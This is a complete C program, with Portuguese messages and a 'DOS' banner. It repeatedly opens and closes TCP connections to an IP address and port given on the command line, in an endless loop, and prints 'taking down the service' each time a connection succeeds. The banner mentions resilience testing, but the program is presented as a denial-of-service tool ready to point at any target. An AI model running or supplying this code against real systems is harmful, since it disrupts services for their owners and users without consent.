#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

void mostrar_demo() {
    printf("==========================================\n");
    printf("                🔥 DOS 🔥                \n");
    printf("==========================================\n");
    printf("➡️  O programa faz múltiplas conexões TCP para um IP e porta específicos.\n");
    printf("➡️  Pode ser usado para testar serviços e avaliar resiliência.\n");
    printf("➡️  Uso: ./programa <IP> <PORTA>\n");
    printf("➡️  Exemplo: ./programa 192.168.1.1 21\n");
    printf("------------------------------------------\n");
    sleep(3);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("❌ Uso incorreto!\n");
        printf("Modo correto: %s <IP> <PORTA>\n", argv[0]);
        return 1;
    }

    mostrar_demo();  

    char *ip = argv[1];
    int porta = atoi(argv[2]);

    if (porta <= 0 || porta > 65535) {
        printf("❌ Porta inválida! Escolha um número entre 1 e 65535.\n");
        return 1;
    }

    printf("🎯 Alvo definido: %s na porta %d\n", ip, porta);
    printf("==========================================\n");

    struct sockaddr_in alvo;

    alvo.sin_family = AF_INET;
    alvo.sin_port = htons(porta);
    alvo.sin_addr.s_addr = inet_addr(ip);

    while (1) {  
        int meusocket = socket(AF_INET, SOCK_STREAM, 0);
        if (meusocket < 0) {
            printf("❌ Erro ao criar socket!\n");
            return 1;
        }

        int conecta = connect(meusocket, (struct sockaddr*)&alvo, sizeof(alvo));

        if (conecta == 0) {
            printf("🔥 Derrubando Serviço: Conexão realizada com sucesso!\n");
        } else {
            printf("⚠️ Falha na conexão...\n");
        }

        close(meusocket); 
        usleep(50000);    
    }

    return 0;
}
